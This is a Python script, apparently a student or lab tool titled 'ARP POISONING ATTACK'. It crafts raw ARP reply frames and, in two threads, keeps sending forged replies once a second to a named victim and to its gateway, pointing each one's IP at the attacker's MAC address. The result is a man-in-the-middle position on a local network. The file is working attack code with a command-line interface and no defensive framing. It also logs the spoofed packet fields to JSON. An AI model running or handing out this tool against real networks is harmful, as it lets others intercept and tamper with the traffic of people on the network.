# -*- coding: UTF-8 -*-
import sys
import socket
import struct
import time
import threading
import argparse
import binascii
import json
import os


def Json_Parse(mac_sender, ip_sender, mac_target, ip_target):
    object = {}
    object["mac_sender"] = mac_sender
    object["ip_sender"] = ip_sender
    object["mac_target"] = mac_target
    object["ip_target"] = ip_target
    object["hardware_type"] = 'Ethernet'
    object["pro_type"] = 'IPv4'
    object["hardware_len"] = '6'
    object["pro_len"] = '4'
    object["op"] = 'ARP Reply'
    # json_object = json.dumps(object)
    # print(json_object)
    return object

def write_json(data, filename):
    cur_path = os.path.dirname(__file__)
    new_path = os.path.join(cur_path, '..', 'log', filename)
    print(data)
    print("\n")
    with open(new_path,"w") as f:
        json.dump(data,f)

def arp_reply_packet_creator(src_mac,src_ip,des_mac,des_ip):
    #Ethernet header
    des_eth_mac=des_mac #Ethernet destination address   
    src_eth_mac=src_mac #Ethernet source address
    frame_type=b'\x08\x06' #Address Resolution Protocol; b'\x08\x06' == (ARP)

    #ARP packet header
    hardware_type=b'\x00\x01' #Hardware Type (HTYPE) == Ethernet
    pro_type=b'\x08\x00' #PTYPE (Protocol Type) == IPv4
    hardware_len=b'\x06' #HLEN (Hardware Length) == 6(Ethernet)
    pro_len=b'\x04' #PLEN (Protocol Length) == 4(IPv4)
    
    #op
    op=b'\x00\x02' #OPER (Operation) == 2(ARP Reply)
    
    
    sender_mac=src_eth_mac #Sender Ethernet address
    
    sender_ip=socket.inet_aton(src_ip) #Sender IP address
    
    target_mac=des_eth_mac #Receiver Ethernet address
    
    target_ip=socket.inet_aton(des_ip) #Receiver IP address

    return struct.pack("!6s6s2s2s2s1s1s2s6s4s6s4s",des_eth_mac,src_eth_mac,frame_type,hardware_type,pro_type,hardware_len,pro_len,op,sender_mac,sender_ip,target_mac,target_ip)



def send_arp(src_mac,src_ip,des_mac,des_ip):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind(("eth0", 0))
    reply_packet=arp_reply_packet_creator(src_mac,src_ip,des_mac,des_ip)

    s.send(reply_packet)


def send_to_ubuntu(src_mac,fake_src_ip,des_mac,des_ip, json_vars):

    print("==============================================================================================================================================")
    print("========================================================== Send ARP reply to Victim ==========================================================")
    print("==============================================================================================================================================")
    json_vars.append(Json_Parse(src_mac, fake_src_ip, des_mac, des_ip))
    write_json(json_vars,"poisoning_temp.json")

    while 1:
        send_arp(binascii.unhexlify(src_mac.replace(':', '')),fake_src_ip,binascii.unhexlify(des_mac.replace(':', '')),des_ip)
        time.sleep(1)

def send_to_gateway(src_mac,fake_src_ip,des_mac,des_ip, json_vars):

    print("==============================================================================================================================================")
    print("========================================================== Send ARP reply to Gateway =========================================================")
    print("==============================================================================================================================================")
    json_vars.append(Json_Parse(src_mac, fake_src_ip, des_mac, des_ip))
    write_json(json_vars,"test.json")

    while 1:
        send_arp(binascii.unhexlify(src_mac.replace(':', '')),fake_src_ip,binascii.unhexlify(des_mac.replace(':', '')),des_ip)
        time.sleep(1)
"""
========================================================================================================================================================
"""
def UserInput():
    #Cài đặt tham số khi dùng trên terminal
    parser = argparse.ArgumentParser("MTA TOOL: ARP POISONING ATTACK")
    parser.add_argument("-aM", "--macattacker", help="Specify the Attacker's MAC address", required=True)
    parser.add_argument("-vM", "--macvictim", help="Specify the Victim's MAC address", required=True)
    parser.add_argument("-gM", "--macgateway", help="Specify Gateway's MAC Address", required=True)
    parser.add_argument("-vI", "--ipvictim", help="Specify the Victim's IP address", required=True)
    parser.add_argument("-gI", "--ipgateway", help="Specify the Gateway's IP address", required=True)
    args = parser.parse_args()
    return args.macattacker, args.macvictim, args.macgateway, args.ipvictim, args.ipgateway    


src_mac, des_mac_u, des_mac_g, fake_src_ubuntu_ip, fake_src_gateway_ip = UserInput()

json_vars = []

# Start the thread sent to Ubuntu_Victim
thread = threading.Thread(target=send_to_ubuntu, daemon=True, args=(src_mac,fake_src_gateway_ip,des_mac_u,fake_src_ubuntu_ip, json_vars))
thread.start()

time.sleep(0.1)

# Start sending to the gateway thread
thread = threading.Thread(target=send_to_gateway, daemon=True, args=(src_mac,fake_src_ubuntu_ip,des_mac_g,fake_src_gateway_ip, json_vars))
thread.start()

time.sleep(0.1)